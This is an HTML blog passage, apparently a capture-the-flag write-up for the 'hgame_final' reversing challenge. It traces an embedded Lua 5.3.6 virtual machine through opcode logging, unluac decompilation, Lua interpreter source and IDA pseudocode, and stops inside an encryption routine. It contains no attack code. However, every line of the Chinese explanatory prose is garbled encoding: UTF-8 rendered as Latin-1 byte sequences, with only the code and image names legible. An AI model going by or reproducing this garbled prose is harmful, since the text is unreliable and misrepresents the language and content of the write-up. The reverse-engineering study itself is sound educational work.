    <content><![CDATA[<h2 id="hgame-final-by-RogerThat"><a href="#hgame-final-by-RogerThat" class="headerlink" title="hgame_final by RogerThat"></a>hgame_final by RogerThat</h2><p> å¯¹äºè¿™é“é¢˜ç›®æœ‰å¥½ä¸¤ä¸ªæ€è·¯å¯ä»¥è¿›è¡Œï¼Œå…¶ä¸€æ˜¯ç›´æ¥è¿›å…¥ç¨‹åºï¼Œåœ¨é€†å‘è¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä¸€ä¸ªæ¥ç®¡å‡ ä¹å…¨éƒ¨ç¨‹åºçš„ switch ç»“æ„ã€‚å¾ˆå…¸å‹çš„ç›´å†²ç›´æ’é€†å‘æ‰‹ï¼ˆåœ¨æ²¡æœ‰ hint çš„æƒ…å†µä¸‹ï¼‰ã€‚</p>
<p>åœ¨æˆ‘è¿™è¾¹çš„ç¯å¢ƒä¸‹è¿™ä¸ªå‡½æ•°åœ¨ sub_7FF6A2994F44</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/virtual_machain.jpg" alt="virtual_machain"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªä»£ç å¾ˆéš¾çœ‹æ‡‚ï¼Œä½†æ˜¯å¯ä»¥çœ‹å‡ºä»–çš„åˆ†æ”¯æœ‰ 46 ç§ï¼Œä¸€èˆ¬å‡ºç°è¿™ä¹ˆé•¿çš„ switch ç»“æ„æ˜¯å¾ˆæœ‰é—®é¢˜çš„ï¼Œè€Œä¸”æ ¹æ®æˆ‘çš„åˆ†æï¼Œè°ƒç”¨ä¸åŒçš„ switch ä»–ä¼šè°ƒç”¨å‡½æ•°ç­‰ç­‰ï¼Œè¾“å‡ºå‡º</p>
<pre class="line-numbers language-none"><code class="language-none">Welcome to HGAME final!

what is your flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<p>åœ¨ä¸€å¼€å§‹ä¸çŸ¥é“è¿™ä¸ªå’Œ lua çš„æƒ…å†µä¸‹ç„¦å¤´çƒ‚é¢ï¼Œå› ä¸ºæƒ³åˆ†æè¿™ä¸ªè™šæ‹Ÿæœºéš¾åº¦éå¸¸é«˜ï¼Œåæ¥æˆ‘ä¹Ÿåªæ˜¯åœ¨æºç çš„å¸®åŠ©ä¸‹æ‰å‹‰å¼ºç†è§£ã€‚ä¸€å¼€å§‹é€šè¿‡ x64_dbg è‡ªå¸¦çš„æ¡ä»¶æ–­ç‚¹ï¼Œæˆ‘è®©ä»–è¾“å‡ºå‡ºäº† siwtch çš„åˆ†æ”¯ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/switch_case.jpg" alt="switch_case"></p>
<p>å…·ä½“çš„ OPCODE æˆ‘å°±ä¸å±•ç¤ºäº†ï¼Œå¾ˆé•¿å¾ˆé•¿ï¼Œè€Œä¸”å¤§éƒ¨åˆ†éƒ½æ˜¯ case 1ã€‚</p>
<p>ä½†æ˜¯å½“æˆ‘çŸ¥é“äº†å®ƒå’Œ lua æœ‰å…³ï¼Œé‚£å°±ä¸ä¸€æ ·äº†ï¼Œå†…ç½®çš„è™šæ‹Ÿæœºå¿…ç„¶ä¼šå»æ‰§è¡Œ lua ä»£ç ï¼Œæˆ–è€… lua 2 luac.out çš„å­—èŠ‚ç ã€‚è¿™ä¸ªä»£ç å…¶å®å°±æ˜¯åœ¨ pe æ–‡ä»¶é‡Œé¢ï¼Œå…¶å® mezone ç»™çš„ out æ–‡ä»¶å¤šäº† debugä¿¡æ¯çš„ï¼Œåè€Œæ›´å®¹æ˜“çŸ¥é“é€»è¾‘ã€‚</p>
<p>å…³äºæˆ‘ lua å­¦ä¹ æ•´ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä¸¢åœ¨äº† mind_strom.md ä¸­äº†ï¼Œè¿˜æŒºæœ‰çºªå¿µä»·å€¼ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/need_dump.jpg" alt="need_dump"></p>
<p>åé¢è¿˜æœ‰å¥½å¤šï¼Œè€Œä¸”æ²¡æœ‰ debug çš„ä¿¡æ¯ï¼Œåªå¥½å¯¹ç…§ç€æºç å»å¯»æ‰¾èŠ‚åŒºã€‚</p>
<p>åœ¨ pe ä¸­æœ‰è¿™ä¹ˆä¸€ä¸²å…¸å‹çš„ luac.out æ–‡ä»¶ï¼Œè€Œä¸”å¯ä»¥åœ¨ exe ä¸­æ‰¾åˆ° version 5.3.6 å…¶å®è¿™é‡Œ mezone è¯´çš„ luadec å…¶å®æœ‰ä¸€ç‚¹é—®é¢˜ï¼Œå¯¹äºæ²¡æœ‰ debug ä¿¡æ¯çš„ .out ä¸æ˜¯å¾ˆæ”¯æŒï¼Œè€Œä¸”é…ç½®ç¯å¢ƒæœ‰ç‚¹éº»çƒ¦ï¼Œè¿™é‡Œæ¨èæˆ‘åˆšæ‰¾åˆ°çš„æ–°å·¥å…·ï¼Œunluac æ”¯æŒ 5.1 - 5.4 ï¼Œ<strong>unluac_2021_03_11.jar</strong></p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">java <span class="token operator">-</span>jar <span class="token punctuation">.</span>\unluac_2021_03_11<span class="token punctuation">.</span>jar <span class="token punctuation">.</span>\MyByte<span class="token punctuation">.</span>out > <span class="token punctuation">.</span>\myOut<span class="token punctuation">.</span>lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>ç”Ÿæˆçš„ myOut.lua å°±å…ˆä¸å¦¨è¿™äº†ï¼Œå¤ªé•¿äº†ï¼Œæˆ‘æ”¾åœ¨ä¸€ä¸ªå‹ç¼©åŒ…é‡Œé¢å¥½äº†ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/unluac.jpg" alt="unluac"></p>
<p>ä¸æ˜¯å¾ˆå¥½é˜…è¯»ï¼Œæ¯•ç«Ÿæ²¡æœ‰ â€œç¬¦å·æ–‡ä»¶â€ â€œdebug ä¿¡æ¯â€ã€‚ä¸è¿‡ä¹Ÿè¿˜å¥½ï¼Œé€»è¾‘ä¹Ÿèƒ½çŸ¥é“ã€‚</p>
<p>çŸ¥é“äº†è¿™ä¸ªæ–‡ä»¶ä¹‹åä¼šå‘ç°æœ‰ä¸€ä¸ªåŠ å¯†å‡½æ•° hgame.enc ã€‚å¾ˆé™Œç”Ÿï¼Œæˆ‘å†³å®šåˆ†æä¸€ä¸‹ OPCODE ä¸€æ¢ç©¶ç«Ÿã€‚é™„ä»¶ï¼šopcode.txt å¾ˆå¤šéƒ½æ˜¯æ‰‹æ‰“çš„ï¼Œæ¯•ç«Ÿè¦åˆ†æè™šæ‹Ÿæœºè¡Œä¸ºã€‚</p>
<p>å…³é”®éƒ¨åˆ†</p>
<pre class="line-numbers language-none"><code class="language-none">&#123;OP_EQ&#125;         in case 31
&#123;OP_MOVE&#125;       in case 0
&#123;OP_LOADK&#125;      in case 1
&#123;OP_CONCAT&#125;     in case 29
&#123;OP_LOADK&#125;      in case 1
&#123;OP_GETTABUP&#125;   in case 6
&#123;OP_LOADK&#125;      in case 1

&#123;OP_GETTABLE&#125;   in case 7
&#123;OP_MOVE&#125;       in case 0
############################# hgame.enc
&#123;OP_CALL&#125;       in case 36
Under CASE 24,I jmp to small case 16
##############################

&#123;OP_NEWTABLE&#125;   in case 11

&#123;OP_LOADK&#125;      in case 1
&#123;OP_LOADK&#125;      in case 1
&#123;OP_LOADK&#125;      in case 1
&#123;OP_FORPREP&#125;    in case 40
&#123;OP_FORLOOP&#125;    in case 39
&#123;OP_LOADK&#125;      in case 1
&#123;OP_SELF&#125;       in case 12
&#123;OP_MOVE&#125;        in case 0
&#123;OP_MOVE&#125;       in case 0
&#123;OP_CALL&#125;        in case 36
Under CASE 24,I jmp to small case 16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span> L2_2 <span class="token operator">~=</span> <span class="token number">64</span> <span class="token keyword">then</span>
  L2_2 <span class="token operator">=</span> print
  L3_2 <span class="token operator">=</span> <span class="token string">"NO!"</span>
  <span class="token function">L2_2</span><span class="token punctuation">(</span>L3_2<span class="token punctuation">)</span>
  <span class="token keyword">return</span>
<span class="token keyword">end</span>
L2_2 <span class="token operator">=</span> L0_2
L3_2 <span class="token operator">=</span> <span class="token string">"0000000000000000"</span>
L0_2 <span class="token operator">=</span> L2_2 <span class="token operator">..</span> L3_2
L2_2 <span class="token operator">=</span> <span class="token string">"hgame"</span>
L2_2 <span class="token operator">=</span> _ENV<span class="token punctuation">[</span>L2_2<span class="token punctuation">]</span>
L3_2 <span class="token operator">=</span> <span class="token string">"enc"</span>
L2_2 <span class="token operator">=</span> L2_2<span class="token punctuation">[</span>L3_2<span class="token punctuation">]</span>
L3_2 <span class="token operator">=</span> L0_2
<span class="token function">L2_2</span><span class="token punctuation">(</span>L3_2<span class="token punctuation">)</span>
L2_2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
L3_2 <span class="token operator">=</span> <span class="token number">1</span>
L4_2 <span class="token operator">=</span> <span class="token number">80</span>
L5_2 <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">for</span> L6_2 <span class="token operator">=</span> L3_2<span class="token punctuation">,</span> L4_2<span class="token punctuation">,</span> L5_2 <span class="token keyword">do</span>
  L9_2 <span class="token operator">=</span> <span class="token string">"byte"</span>
  L8_2 <span class="token operator">=</span> L0_2
  <span class="token comment">--......--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>å¯ä»¥å¯¹æ¯” unluac å¾—åˆ°çš„ä»£ç ï¼Œå‘ç° hgame.enc è¿™ä¸ªå‡½æ•°è„±ç¦»äº†è¿™ä¸ªè™šæ‹Ÿæœºè€Œè¿ä½œï¼ŒåŠ å¯†äº†ä¹‹åå†è¿›è¡Œä¸‹å»ã€‚è¿™é‡Œå¯ä»¥çœ‹çœ‹æºç ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">vmcase</span><span class="token punctuation">(</span>OP_CALL<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token function">GETARG_B</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> nresults <span class="token operator">=</span> <span class="token function">GETARG_C</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> L<span class="token operator">-></span>top <span class="token operator">=</span> ra<span class="token operator">+</span>b<span class="token punctuation">;</span>  <span class="token comment">/* else previous instruction set top */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">luaD_precall</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> ra<span class="token punctuation">,</span> nresults<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* C function? */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>nresults <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>
      L<span class="token operator">-></span>top <span class="token operator">=</span> ci<span class="token operator">-></span>top<span class="token punctuation">;</span>  <span class="token comment">/* adjust results */</span>
    <span class="token function">Protect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* update 'base' */</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token comment">/* Lua function */</span>
    ci <span class="token operator">=</span> L<span class="token operator">-></span>ci<span class="token punctuation">;</span>
    <span class="token keyword">goto</span> newframe<span class="token punctuation">;</span>  <span class="token comment">/* restart luaV_execute over new Lua function */</span>
  <span class="token punctuation">&#125;</span>
  vmbreak<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ä»–ä¼šåˆ†æè¿™ä¸ªè¦è°ƒç”¨çš„å‡½æ•°æ˜¯å¦æ˜¯ lua ç¨‹åº æˆ–è€… C ç¨‹åºï¼Œè€Œå¦‚æœæ˜¯ lua ç¨‹åºçš„è¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¿›å…¥ä¸€ä¸ª æ‰€è°“ newframe ï¼Œå…¶å®å°±æ˜¯æ–°çš„ä¸€ä¸ªè™šæ‹Ÿæœºã€‚</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">void <span class="token function">luaV_execute</span> <span class="token punctuation">(</span>lua_State <span class="token operator">*</span>L<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  CallInfo <span class="token operator">*</span>ci <span class="token operator">=</span> L<span class="token operator">-</span><span class="token operator">></span>ci<span class="token punctuation">;</span>
  LClosure <span class="token operator">*</span>cl<span class="token punctuation">;</span>
  TValue <span class="token operator">*</span>k<span class="token punctuation">;</span>
  StkId base<span class="token punctuation">;</span>
  ci<span class="token operator">-</span><span class="token operator">></span>callstatus <span class="token operator">|</span><span class="token operator">=</span> CIST_FRESH<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> fresh invocation of 'luaV_execute" <span class="token operator">*</span><span class="token operator">/</span>
<span class="token comment">------------------------------important----------------------------</span>
 newframe<span class="token punctuation">:</span>  <span class="token operator">/</span><span class="token operator">*</span> reentry point when frame <span class="token function">changes</span> <span class="token punctuation">(</span>call<span class="token operator">/</span><span class="token keyword">return</span><span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">/</span>
<span class="token comment">--------------------------------------------------------------------</span>
  <span class="token function">lua_assert</span><span class="token punctuation">(</span>ci <span class="token operator">==</span> L<span class="token operator">-</span><span class="token operator">></span>ci<span class="token punctuation">)</span><span class="token punctuation">;</span>
  cl <span class="token operator">=</span> <span class="token function">clLvalue</span><span class="token punctuation">(</span>ci<span class="token operator">-</span><span class="token operator">></span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> reference to <span class="token keyword">function</span>'s closure <span class="token operator">*</span><span class="token operator">/</span>
  k <span class="token operator">=</span> cl<span class="token operator">-</span><span class="token operator">></span>p<span class="token operator">-</span><span class="token operator">></span>k<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> reference to <span class="token keyword">function</span>'s constant table <span class="token operator">*</span><span class="token operator">/</span>
  base <span class="token operator">=</span> ci<span class="token operator">-</span><span class="token operator">></span>u<span class="token punctuation">.</span>l<span class="token punctuation">.</span>base<span class="token punctuation">;</span>  <span class="token operator">/</span><span class="token operator">*</span> <span class="token keyword">local</span> copy of <span class="token keyword">function</span>'s base <span class="token operator">*</span><span class="token operator">/</span>
  <span class="token operator">/</span><span class="token operator">*</span> main loop of interpreter <span class="token operator">*</span><span class="token operator">/</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    Instruction i<span class="token punctuation">;</span>
    StkId ra<span class="token punctuation">;</span>
    <span class="token function">vmfetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">vmdispatch</span> <span class="token punctuation">(</span><span class="token function">GET_OPCODE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">--.....--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç”±æ­¤å¯è§è¿™ä¸æ˜¯ä¸€ä¸ª lua ç¨‹åºï¼Œæˆ‘ä»¬åº”è¯¥å»å¯»æ‰¾ä¸€ä¸ª C functionã€‚ä¸ºäº†å¯»æ‰¾è¿™ä¸ªï¼Œæˆ‘çš„è®¾æƒ³æ˜¯åœ¨ å­˜å‚¨ç€æˆ‘çš„å­—ç¬¦ä¸²çš„åœ°æ–¹ä¸‹æ–­ï¼Œè€Œè¿™ä¸ªå°±æ¶‰åŠ lua çš„å¯„å­˜å™¨ Table TValue ç­‰ç»“æ„çš„å­˜å‚¨ã€‚</p>
<p>å°è¯•ä¸€ä¸‹ã€‚æˆ‘ä¸‹æ–­ç‚¹ä¸‹åœ¨ OP_GETTABLE ä¹Ÿå°±æ˜¯ case 7ï¼Œä»–çš„ä¸‹ä¸€æ­¥å°±æ˜¯ OP_MOVE å†ä¸‹ä¸€æ­¥å°±æ˜¯ OP_CALL è°ƒç”¨ hgame.enc å‡½æ•°ï¼Œé€šè¿‡è¿™ä¸ª OP_GETTABLE æˆ‘èƒ½å¾—åˆ°ä»–çš„ input çš„ç»“æ„ï¼Œå› ä¸º OP_MOVE åœ¨è£…è½½å‚æ•°</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">vmcase</span><span class="token punctuation">(</span>OP_GETTABLE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    StkId rb <span class="token operator">=</span> <span class="token function">RB</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    TValue <span class="token operator">*</span>rc <span class="token operator">=</span> <span class="token function">RKC</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gettableProtected</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> rb<span class="token punctuation">,</span> rc<span class="token punctuation">,</span> ra<span class="token punctuation">)</span><span class="token punctuation">;</span>
    vmbreak<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
###########################
<span class="token keyword">typedef</span> <span class="token keyword">union</span> Value <span class="token punctuation">&#123;</span>
  GCObject <span class="token operator">*</span>gc<span class="token punctuation">;</span>    <span class="token comment">/* collectable objects */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>         <span class="token comment">/* light userdata */</span>
  <span class="token keyword">int</span> b<span class="token punctuation">;</span>           <span class="token comment">/* booleans */</span>
  lua_CFunction f<span class="token punctuation">;</span> <span class="token comment">/* light C functions */</span>
  lua_Integer i<span class="token punctuation">;</span>   <span class="token comment">/* integer numbers */</span>
  lua_Number n<span class="token punctuation">;</span>    <span class="token comment">/* float numbers */</span>
<span class="token punctuation">&#125;</span> Value<span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TValuefields</span>	<span class="token expression">Value value_<span class="token punctuation">;</span> <span class="token keyword">int</span> tt_</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">lua_TValue</span> <span class="token punctuation">&#123;</span>
  TValuefields<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> TValue<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">7u</span><span class="token operator">:</span>
  v71 <span class="token operator">=</span> <span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">+</span> v55<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">+</span> v54<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v56 <span class="token operator">>></span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1FF</span><span class="token punctuation">)</span> <span class="token operator">+</span> v55<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æ˜¾ç„¶è¿™ä¸ª v4 å°±æ˜¯ Tvalue *rcï¼›åœ¨ x64_dbg ä¸­è·Ÿè¸ªè¿™ä¸ªä¸œè¥¿ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/TValue.jpg" alt="TValue"></p>
<p>åœ¨æ­¤å¤„ GETTABLE ä¸‹ä¸€ä¸ªæ–­åœ¨ OP_CALL ä½¿å¾—è¿™ä¸ªçœŸæ­£åŠ è½½å®Œã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/out_TValue.jpg" alt="out_TValue"></p>
<p>åœ¨æ ‡è“è‰²çš„åœ°æ–¹ä¸‹ä¸€ä¸ª 1byte ç¡¬ä»¶å†™å…¥æ–­ç‚¹ï¼Œè¿è¡Œã€‚ï¼ˆæˆ‘è¿™é‡Œå†™äº†åŠ ç¡¬ä»¶å†™å…¥æ–­ç‚¹ï¼Œä½†æ˜¯åˆšæ‰è°ƒè¯•çš„æ—¶å€™å¿˜è®°åŠ äº†ã€‚ã€‚åˆå¾—é‡æ¥ä¸€éï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/hardware_breakpoint.jpg" alt="hardware_breakpoint"></p>
<p>èµ°å‡ºè¿™ä¸ª dll ä»£ç ï¼Œè‚¯å®šæ˜¯å“ªé‡Œè°ƒç”¨äº†ä»€ä¹ˆä¿®æ”¹è¿™ä¸ªå­—ç¬¦ä¸²çš„å‡½æ•°ã€‚</p>
<p>å‘ç°è¿™ä¸ªå‡½æ•°åœ¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/out_step.jpg" alt="out_step"></p>
<p>å›åˆ° ida æ‰¾è¿™ä¸ªä»£ç æ‰€åœ¨ã€‚</p>
<p>ä¼šå‘ç°è¿™ä¸ªä¸¤ä¸ªä»£ç ï¼Œçœ‹æ¥æ˜¯åŠ å¯†å‡½æ•°æ— ç–‘äº†ã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">may_change_string</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>
  <span class="token class-name">size_t</span> Size<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp+8h] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>Src<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp+28h]</span>
  _OWORD v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp+48h] BYREF</span>
  _OWORD v8<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A8h] [rbp+78h] BYREF</span>
  <span class="token keyword">int</span> part_of_my_string<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+E0h] [rbp+B0h] BYREF</span>
  <span class="token keyword">char</span> used_to_output<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+150h] [rbp+120h] BYREF</span>
  <span class="token keyword">char</span> v11<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1C0h] [rbp+190h] BYREF</span>
  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+244h] [rbp+214h]</span>
  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+264h] [rbp+234h]</span>

  v1 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">258</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
    v1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sub_7FF6A2941A7D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_7FF6A29C40B3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  Src <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_7FF6A29410A0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1</span>i64<span class="token punctuation">,</span> Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  Size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span>i64<span class="token punctuation">;</span>
  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> xmmword_7FF6A29B3238<span class="token punctuation">;</span>
  v8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> xmmword_7FF6A29B3250<span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x47u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">,</span> Src<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>part_of_my_string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>used_to_output<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x50u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v12 <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>
  v13 <span class="token operator">=</span> <span class="token function">must_enc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>part_of_my_string<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> used_to_output<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">j_memcpy</span><span class="token punctuation">(</span>Src<span class="token punctuation">,</span> used_to_output<span class="token punctuation">,</span> <span class="token number">0x50u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
